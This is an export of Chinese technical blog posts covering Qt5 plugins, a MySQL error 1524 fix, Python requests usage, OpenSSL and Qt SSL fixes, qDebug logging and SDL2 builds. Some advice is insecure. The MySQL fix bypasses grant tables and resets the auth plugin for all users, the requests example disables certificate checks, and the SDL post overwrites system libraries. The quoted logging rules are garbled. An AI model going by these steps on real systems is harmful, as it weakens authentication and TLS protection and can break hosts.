<li>Export the plugin using the Q_PLUGIN_METADATA() macro.</li>
<li>Build the plugin using a suitable .pro file.</li>
</ul>
<hr>
<p><strong><font color="red">注意：</font></strong>Q_EXPORT_PLUGIN，Q_EXPORT_PLUGIN2 宏在Qt5不能用了，用新的宏 <strong>Q_PLUGIN_METADATA</strong>。</p>
<h3 id="生成插件"><a href="#生成插件" class="headerlink" title="生成插件"></a>生成插件</h3><p>创建一个应用程序插件，要先创建一个插件接口类（interface），它只能包含，再创建一个插件类，并继承自这个接口类。下面以一个简单的例子说明：)</p>
<p>（新建一个空的Qt项目）</p>
<p>mytestplugininterface.h <strong>接口类</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYTESTPLUGININTERFACE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYTESTPLUGININTERFACE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QString&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QObject&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTestPluginInterface</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~MyTestPluginInterface()&#123;&#125;</span><br><span class="line">    <span class="comment">//纯虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">helloworld</span><span class="params">(QString <span class="built_in">string</span>)</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//第二个参数指定 唯一IID标识符，其实就是个字符串</span></span><br><span class="line">Q_DECLARE_INTERFACE(MyTestPluginInterface,<span class="string">"myplugin.example.my.com"</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYTESTPLUGININTERFACE_H</span></span></span><br></pre></td></tr></table></figure>

<p>mytestplugin.h <strong>插件类头文件</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYTESTPLUGIN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYTESTPLUGIN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"mytestplugininterface.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QObject&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTestPlugin</span>:</span><span class="keyword">public</span> QObject,MyTestPluginInterface</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line">     <span class="comment">//导出该插件</span></span><br><span class="line">    Q_PLUGIN_METADATA(IID <span class="string">"myplugin.example.my.com"</span>)</span><br><span class="line">     <span class="comment">//将该接口注册到Qt的元对象系统</span></span><br><span class="line">    Q_INTERFACES(MyTestPluginInterface)</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyTestPlugin();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">helloworld</span><span class="params">(QString <span class="built_in">string</span>)</span></span>;</span><br><span class="line">    ~MyTestPlugin()&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYTESTPLUGIN_H</span></span></span><br></pre></td></tr></table></figure>

<p>mytestplugin.cpp <strong>插件类cpp源文件</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"mytestplugin.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QtPlugin&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line">MyTestPlugin::MyTestPlugin()&#123;&#125;</span><br><span class="line"><span class="comment">//重写该接口类的虚函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyTestPlugin::helloworld</span><span class="params">(QString <span class="built_in">string</span>)</span></span>&#123;</span><br><span class="line">    qDebug()&lt;&lt;<span class="string">"Hello---&gt; "</span>&lt;&lt;<span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后就是编辑.pro文件并构建该插件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TEMPLATE = lib</span><br><span class="line">CONFIG += plugin</span><br><span class="line">TARGET = mytestPlugin</span><br><span class="line">DESTDIR = ../outputDir</span><br><span class="line">HEADERS += \</span><br><span class="line">    mytestplugin.h \</span><br><span class="line">    mytestplugininterface.h</span><br><span class="line">SOURCES += \</span><br><span class="line">    mytestplugin.cpp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CONFIG 表明要构建一个插件<br>TARGET 指定生成的.dll 或 .so 文件名<br>DESTDIR 指定生成的.dll 或 .so 文件所在的目录</p>
</blockquote>
<p>最后还要把本地部署改为<strong>Release</strong>，然后在构建该项目即可生成指定的库文件，比如我的是 <strong>libmytestPlugin.so</strong></p>
<h3 id="测试插件"><a href="#测试插件" class="headerlink" title="测试插件"></a>测试插件</h3><p>为了做一个简单的测试，我另外创建了一个项目，调用插件也很简单，这里给出核心代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用QPluginLoader加载动态链接库，注意QLibrary类与QPluginLoader类的区别</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPluginLoader&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"mytestplugininterface.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::loadmyPlugin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QPluginLoader *loader=<span class="keyword">new</span> QPluginLoader(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//把插件文件和包含插件声明的文件放到项目下</span></span><br><span class="line">    loader-&gt;setFileName(<span class="string">"libmytestPlugin.so"</span>);</span><br><span class="line">    <span class="comment">//判断加载插件是否成功</span></span><br><span class="line">    <span class="keyword">if</span>(!loader-&gt;load())&#123;</span><br><span class="line">        qDebug()&lt;&lt;<span class="string">"Error:"</span>&lt;&lt;loader-&gt;errorString();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//遍历插件的元数据信息</span></span><br><span class="line">    foreach (QString key,loader-&gt;metaData().keys()) &#123;</span><br><span class="line">        qDebug()&lt;&lt;key&lt;&lt;<span class="string">"\t"</span>&lt;&lt;loader-&gt;metaData().value(key);</span><br><span class="line">    &#125;</span><br><span class="line">    QObject*plugin= loader-&gt;instance();</span><br><span class="line">    <span class="comment">//转换获取插件类对象</span></span><br><span class="line">    MyTestPluginInterface *mytestpliugin=qobject_cast&lt;MyTestPluginInterface*&gt;(plugin);</span><br><span class="line">    mytestpliugin-&gt;helloworld(<span class="string">"Google..."</span>);</span><br><span class="line">    <span class="comment">//卸载插件</span></span><br><span class="line">    loader-&gt;unload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ok，到此基本上完成了一个简单的插件使用了 ：)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql error 1524-unix_socket</title>
    <url>/mysql-error-unix-socket/</url>
    <content><![CDATA[<p>在登录MySQL时显示错误 <code>mysql &quot;ERROR 1524 (HY000): Plugin &#39;unix_socket&#39; is not loaded&quot;</code></p>
<a id="more"></a>

<p>参考原文: <a href="https://askubuntu.com/questions/705458/ubuntu-15-10-mysql-error-1524-unix-socket" target="_blank" rel="noopener">https://askubuntu.com/questions/705458/ubuntu-15-10-mysql-error-1524-unix-socket</a></p>
<p>解决办法</p>
<blockquote>
<p>/etc/init.d/mysql stop<br>sudo killall mysqld_safe<br>sudo killall mysqld<br>sudo mysqld_safe –skip-grant-tables &amp;<br>mysql -u root<br>use mysql;<br>update user set password=<strong>PASSWORD(“MySQL密码”)</strong> where User=’root’;<br>update user set plugin=”<strong>mysql_native_password</strong>“;<br>quit;<br>/etc/init.d/mysql stop<br>sudo kill -9 $(pgrep mysql)<br>/etc/init.d/mysql start</p>
</blockquote>
<p>这是原文，挺详细的…</p>
<p>The “<strong>unix_socket</strong>” has been called by mysql authentication process (maybe related to a partial migration of database to mariadb, now removed). To get all stuff back working go su:</p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>then follow:</p>
<blockquote>
<p>/etc/init.d/mysql stop<br>mysqld_safe –skip-grant-tables &amp;<br>mysql -uroot</p>
</blockquote>
<p>This will completely stop mysql, bypass user authentication (no password needed) and connect to mysql with user “root”.</p>
<p>Now, in mysql console, go using mysql administrative db:</p>
<blockquote>
<p>use mysql;</p>
</blockquote>
<p>To reset root password to mynewpassword (change it at your wish), just to be sure of it:</p>
<blockquote>
<p>update user set password=PASSWORD(“mynewpassword”) where User=’root’;</p>
</blockquote>
<p>And this one will overwrite authentication method, remove the unix_socket request (and everything else), restoring a normal and working password method:</p>
<blockquote>
<p>update user set plugin=”mysql_native_password”;</p>
</blockquote>
<p>Exit mysql console:</p>
<blockquote>
<p>quit;</p>
</blockquote>
<p>Stop and start everything related to mysql:</p>
<blockquote>
<p>/etc/init.d/mysql stop<br>kill -9 $(pgrep mysql)<br>/etc/init.d/mysql start<br>Don’t forget to exit the su mode.</p>
</blockquote>
<p>Now mySQL server is up and running. You can login it with root:</p>
<blockquote>
<p>mysql -u root -p</p>
</blockquote>
<p>or whatever you wish. Password usage is operative.</p>
<p>That’s it.</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Python requests模块</title>
    <url>/python-requests/</url>
    <content><![CDATA[<p>Python里有自带的 <strong>urllib</strong> 库,提供了许多强大的功能来获取URL信息,而 <strong>urllib2</strong> 则提供了一组基于请求(request)的功能.两者可以相铺相成.而今天的主角是第三方库 <strong>requests</strong> ,其以简单的方式去获取URL,复杂性没有urllib高</p>
<a id="more"></a>

<h3 id="获取requests"><a href="#获取requests" class="headerlink" title="获取requests"></a>获取requests</h3><p>最简单的方法就是 <code>pip install requests</code> ,然后就可以使用了</p>
<h3 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h3><p>首先,需要导入 Requests 模块,这里就介绍 <strong>get</strong> 函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, params=None, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">r"""Sends a GET request.</span></span><br><span class="line"><span class="string">    :param url: URL for the new :class:`Request` object.</span></span><br><span class="line"><span class="string">    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.</span></span><br><span class="line"><span class="string">    :param \*\*kwargs: Optional arguments that ``request`` takes.</span></span><br><span class="line"><span class="string">    :return: :class:`Response &lt;Response&gt;` object</span></span><br><span class="line"><span class="string">    :rtype: requests.Response</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    kwargs.setdefault(<span class="string">'allow_redirects'</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> request(<span class="string">'get'</span>, url, params=params, **kwargs)</span><br></pre></td></tr></table></figure>

<p>可以看到 requests.get 函数 实际是调用了 <strong>requests.Request</strong> 构造请求参数,并返回一个 <strong>requests.Response</strong> 响应对象</p>
<p>类似的,还有 put,delete,head,post,option 请求函数</p>
<h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    query=&#123;<span class="string">'test1'</span>:<span class="string">'123456789'</span>,<span class="string">'test2'</span>:<span class="string">'123456789'</span>&#125;</span><br><span class="line">    r=requests.get(url=<span class="string">'https://www.baidu.com'</span>,params=query)</span><br><span class="line">    <span class="keyword">print</span> r.url  <span class="comment">#返回URL地址</span></span><br><span class="line">    <span class="keyword">print</span> r.status_code  <span class="comment">#返回状态码</span></span><br><span class="line">    <span class="keyword">print</span> r.encoding	<span class="comment">#编码格式</span></span><br><span class="line">    <span class="keyword">print</span> r.headers[<span class="string">'Content-Type'</span>]	<span class="comment">#获取网页header </span></span><br><span class="line">    <span class="keyword">print</span> r.cookies  <span class="comment">#获取cookies</span></span><br><span class="line">    <span class="keyword">print</span> r.text     <span class="comment">#Requests自动解码后数据</span></span><br><span class="line">    <span class="keyword">print</span> r.content <span class="comment">#获取二进制响应内容</span></span><br><span class="line">    <span class="keyword">print</span> r.json()  <span class="comment">#JSON 响应内容 可以和 json 模块使用</span></span><br><span class="line">输出:</span><br><span class="line">https://www.baidu.com/?test1=123456789&amp;test2=123456789</span><br><span class="line"><span class="number">200</span></span><br><span class="line">ISO<span class="number">-8859</span><span class="number">-1</span></span><br><span class="line">text/html</span><br><span class="line">&lt;RequestsCookieJar[&lt;Cookie BDORZ=<span class="number">27315</span> <span class="keyword">for</span> .baidu.com/&gt;]&gt; </span><br><span class="line">返回数据太多,这里不显示了</span><br></pre></td></tr></table></figure>

<p>注意,get函数的params为查询字符串</p>
<h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   user_agent = <span class="string">'Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36'</span></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: user_agent&#125;</span><br><span class="line">    data=&#123;<span class="string">'key1'</span>:<span class="string">'hello'</span>,<span class="string">'key2'</span>:<span class="string">'world'</span>&#125;</span><br><span class="line">    r=requests.post(url=<span class="string">'http://httpbin.org/post'</span>,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">输出:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"key1"</span>: <span class="string">"hello"</span>, </span><br><span class="line">    <span class="string">"key2"</span>: <span class="string">"world"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"21"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36"</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>这是一个 POST 请求 ,其中 <strong>data</strong> 参数表示要提交给服务器的数据 ,<strong>headers</strong> 是一个字典类型的请求头,此处我只指定了 <strong>User-Agent</strong> .</p>
<h3 id="代理访问"><a href="#代理访问" class="headerlink" title="代理访问"></a>代理访问</h3><p>为了访问一些被Q的网站,往往需要设置代理,幸运的是,requests同样也提供的代理这一功能,与之有关的参数为 <strong>proxies</strong></p>
<h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxy=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8087'</span>,</span><br><span class="line">		<span class="string">'https'</span>:<span class="string">'http://127.0.0.1:8087'</span>&#125;</span><br><span class="line">r=requests.get(url=<span class="string">'https://www.google.com'</span>,proxies=proxy,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="keyword">print</span> r.status_code</span><br></pre></td></tr></table></figure>

<p>如果代理需要账户和密码, 则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxies=&#123;</span><br><span class="line">	<span class="string">"http"</span>: <span class="string">"http://username:password@127.0.0.1:8087"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我把 <strong>verify</strong> 设置为 False,是为了SSL证书验证.</p>
<p>也可以通过环境变量 <strong>HTTP_PROXY</strong> 和 <strong>HTTPS_PROXY</strong> 来配置代理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ export HTTP_PROXY=<span class="string">"http://10.10.1.10:3128"</span></span><br><span class="line">$ export HTTPS_PROXY=<span class="string">"http://10.10.1.10:1080"</span></span><br><span class="line">$ python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">"http://example.org"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="会话-Session"><a href="#会话-Session" class="headerlink" title="会话(Session)"></a>会话(Session)</h3><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 <code>urllib3</code> 的 <a href="http://urllib3.readthedocs.io/en/latest/reference/index.html#module-urllib3.connectionpool" target="_blank" rel="noopener">connection pooling</a> 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection" target="_blank" rel="noopener">HTTP persistent connection</a> ).</p>
<p>使用之前需导入类: <code>from requests import Session</code></p>
<h3 id="准备的请求-Prepared-Request"><a href="#准备的请求-Prepared-Request" class="headerlink" title="准备的请求(Prepared Request)"></a>准备的请求(Prepared Request)</h3><p>当你从 API 或者会话调用中收到一个 Response 对象时，request 属性其实是使用了 PreparedRequest。有时在发送请求之前，你需要对 body 或者 header （或者别的什么东西）做一些额外处理</p>
<h4 id="例4"><a href="#例4" class="headerlink" title="例4"></a>例4</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_agent = <span class="string">'Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36'</span></span><br><span class="line">    headers=&#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    <span class="comment"># 开启回话</span></span><br><span class="line">    s= requests.Session()</span><br><span class="line">    req=requests.Request(<span class="string">'GET'</span>,url=<span class="string">'http://baidu.com'</span>)</span><br><span class="line">    <span class="comment"># 开始准备一个请求</span></span><br><span class="line">    prepped= s.prepare_request(req)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># do something with prepped.body</span></span><br><span class="line">    <span class="comment"># do something with prepped.headers</span></span><br><span class="line">    prepped.prepare_headers(headers)</span><br><span class="line">    <span class="comment"># 发送以准备好的请求</span></span><br><span class="line">    resp= s.send(prepped,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">print</span> resp.status_code</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<h3 id="事件挂钩"><a href="#事件挂钩" class="headerlink" title="事件挂钩"></a>事件挂钩</h3><p>Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理</p>
<blockquote>
<p>可用的钩子:<br><strong>response</strong> :<br>从一个请求产生的响应</p>
</blockquote>
<p>可以通过传递一个 {hook_name: callback_function} 字典给 <strong>hooks</strong> 请求参数为每个请求分配一个钩子函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hooks=dict(response=print_url)</span><br></pre></td></tr></table></figure>

<p><strong>callback_function</strong> 会接受一个数据块作为它的第一个参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_url</span><span class="params">(r, *args, **kwargs)</span>:</span></span><br><span class="line">    print(r.url)</span><br></pre></td></tr></table></figure>

<h4 id="例5"><a href="#例5" class="headerlink" title="例5"></a>例5</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_urls</span><span class="params">(r,*args,**kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> r.url</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    <span class="comment"># 钩子</span></span><br><span class="line">    s.hooks=dict(response=print_urls)</span><br><span class="line">    req= requests.Request(<span class="string">'GET'</span>,url=<span class="string">'https://www.github.com'</span>,headers=header)</span><br><span class="line">   </span><br><span class="line">    pre=s.prepare_request(req)</span><br><span class="line">    pre.prepare_headers(header)</span><br><span class="line">    resp=s.send(pre)</span><br><span class="line">    <span class="keyword">print</span> resp.headers</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a></p>
<p>good~</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下Qt发生错误qt.network.ssl:QSslSocket:cannotresolve...</title>
    <url>/linux-qt-network-ssl/</url>
    <content><![CDATA[<p>在Linux上Qt使用network时出现错误:</p>
<blockquote>
<p>qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_client_method<br> qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_client_method<br> qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_server_method<br> qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_server_method<br> qt.network.ssl: QSslSocket: cannot resolve SSL_select_next_proto<br> qt.network.ssl: QSslSocket: cannot resolve SSL_CTX_set_next_proto_select_cb<br> qt.network.ssl: QSslSocket: cannot resolve SSL_get0_next_proto_negotiated<br> qt.network.ssl: QSslSocket: cannot call unresolved function SSL_get0_next_proto_negotiated</p>
</blockquote>
<a id="more"></a>



<p>经网上查阅,大概知道了原因,就是要自己重新编译openssl.第一次用的是1.1版本的,发现还是解决不了,于是下了1.0.1的.<br><a href="https://www.openssl.org/source/old/1.0.1/" target="_blank" rel="noopener">&gt;&gt;链接</a></p>
<blockquote>
<p>wget <a href="https://www.openssl.org/source/old/1.0.1/openssl-1.0.1.tar.gz" target="_blank" rel="noopener">https://www.openssl.org/source/old/1.0.1/openssl-1.0.1.tar.gz</a><br>tar zxvf openssl-1.0.1.tar.gz<br>cd openssl-1.0.1/<br>./config enable-shared<br>make</p>
</blockquote>
<p>在 openssl-1.0.1 目录下生成了so文件,复制到Qt安装目录lib下</p>
<blockquote>
<p>cp libcrypto.so libcrypto.so.1.0.0 libssl.so libssl.so.1.0.0 /opt/Qt5.6.2/5.6/gcc_64/lib</p>
</blockquote>
<p>然后ok</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Qt5 qDebug()不显示调试信息</title>
    <url>/qt-qdebug/</url>
    <content><![CDATA[<p>之前不知怎么,Qt <strong>qDebug()</strong> 无法输出调试信息,不过诸如<br><code>qWarning()</code> <code>qCritical()</code> 可以正常输出</p>
<a id="more"></a>

<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>之前我是用 <strong>qInstallMessageHandler(QtMessageHandler)</strong> 捕获信息,同样也是无法输出 qDebug() 的信息.</p>
<p>最后还是在Qt官网论坛发出帖子寻求帮助<br><a href="https://forum.qt.io/topic/86358/qdebug-can-t-output-text" target="_blank" rel="noopener">https://forum.qt.io/topic/86358/qdebug-can-t-output-text</a></p>
<p>从这个网站找到解决方法 <a href="https://brendanwhitfield.wordpress.com/2016/06/08/enabling-qdebug-on-fedora/" target="_blank" rel="noopener">https://brendanwhitfield.wordpress.com/2016/06/08/enabling-qdebug-on-fedora/</a></p>
<blockquote>
<p>When writing Qt applications, it’s helpful to use a qDebug() statement once in a while. However, I’ve recently found that qDebug() on stock Fedora no longer prints, while qWarning() does. The first thing that the internet tells you is to add CONFIG += console to your .pro file, but alas, this is not the solution. It turns out, because of the way Qt is setup on Fedora, debug output is no longer emitted on stderr (by design). Thanks to this bug report, the solution is to create the following file in either of these locations:</p>
<ul>
<li><strong>~/.config/QtProject/qtlogging.ini (for your user only)</strong></li>
<li><strong>/etc/xdg/QtProject/qtlogging.ini (system-wide)</strong></li>
</ul>
<p><strong>[Rules].debug=trueqt..debug=false</strong></p>
<p>The first rule enables all debug output, while the second disables Qt’s internal debug statements. This prevents a deluge of output from Qt when debugging your application.</p>
</blockquote>
<p>我修改 <code>/etc/xdg/QtProject/qtlogging.ini</code> 文件<br>为</p>
<blockquote>
<p><em>*[Rules]</em> .debug=true<br>qt.*.debug=false</p>
</blockquote>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>SDL2显示PNG图片+播放MP3</title>
    <url>/sdl2-png-mp3/</url>
    <content><![CDATA[<p>在使用SDL时，发现就算编译安装了SDL2_image和SDL_mixer也无法显示png格式图片和播放MP3音频文件。在网上搜索许久，这里总结一下编译过程。。。</p>
<a id="more"></a>

<h3 id="SDL2-image"><a href="#SDL2-image" class="headerlink" title="SDL2_image"></a>SDL2_image</h3><p>首先，我是用一下函数获取错误的信息的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">_texture=IMG_LoadTexture(_renderer,filename.c_str());</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt; SDL_GetError()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>

<p>错误信息如下：<br>Failed loading <strong>png_set_longjmp_fn</strong>: /lib/x86_64-linux-gnu/libpng12.so.0: <strong>undefined symbol</strong>: <strong>_png_set_longjmp_fn</strong></p>
<p>可看到，libpng12.so 这个库文件位定义函数符号 <strong>png_set_longjmp_fn</strong></p>
<p>接着我查找 <strong>libpng12.so</strong> 这个库文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ locate libpng|grep &quot;so&quot;</span><br><span class="line">/lib/x86_64-linux-gnu/libpng12.so.0</span><br><span class="line">/lib/x86_64-linux-gnu/libpng12.so.0.49.0</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libpng.so</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libpng16.so</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libpng16.so.16</span><br><span class="line">/usr/lib/x86_64-linux-gnu/libpng16.so.16.34.0</span><br></pre></td></tr></table></figure>

<p>可看到系统存在两个版本的 <strong>libpng</strong> 库 。如果只存在一个，那么可以自行下载libpng最新版本编译安装，并继续以下操作。<br>其中 <strong>libpng12.so.0.49.0</strong> 是一个比较老的版本了。所以与最新的SDL2可能不兼容，才会出现上面的那个错误。知道的问题后，解决起来似乎也变得简单了。。。</p>
<ul>
<li><p>显示12版本 dynamic symbols</p>
<blockquote>
<p>$ nm -D /lib/x86_64-linux-gnu/libpng12.so.0|grep png_set_longjmp_fn</p>
</blockquote>
</li>
<li><p>显示16版本 dynamic symbols</p>
<blockquote>
<p>$ nm -D /usr/lib/x86_64-linux-gnu/libpng.so|grep png_set_longjmp_fn<br>结果：000000000000a840 T <strong>png_set_longjmp_fn</strong></p>
</blockquote>
</li>
</ul>
<p>所以，解决方法很简单，删除旧的库文件，替换成新的。不过最后我发现了一个奇怪的问题，那就是在从 /lib/x86_64-linux-gnu 路径去除libpng12.so.0这个旧版本的库时，virtualbox虚拟机启动显示 <strong>创建COM对象失败</strong> 。最后重新编译安装了libpng12.so.0并复制到 /lib/x86_64-linux-gnu 目录下才可以！</p>
<blockquote>
<p>cp /usr/lib/x86_64-linux-gnu/<strong>libpng16.so.16.34.0</strong> /lib/x86_64-linux-gnu/<br>ln -s /lib/x86_64-linux-gnu/<strong>libpng16.so.16.34.0</strong> /lib/x86_64-linux-gnu/<strong>libpng16.so</strong> #添加软链接</p>
</blockquote>
<p>之后重新编译 SDL2_image</p>
<blockquote>
<p>./configure<br>make<br>make install</p>
</blockquote>
<h3 id="SDL-mixer"><a href="#SDL-mixer" class="headerlink" title="SDL_mixer"></a>SDL_mixer</h3><p>通过 ./configure –help 查看配置选项。要想支持播放MP3格式，只需添加以下配置参数</p>
<blockquote>
<p>./configure –<strong>enable-music-mp3</strong> –<strong>enable-music-mp3-mad-gpl</strong><br>make<br>make insatll</p>
</blockquote>
<p>ldd build/.libs/libSDL2_mixer.so</p>
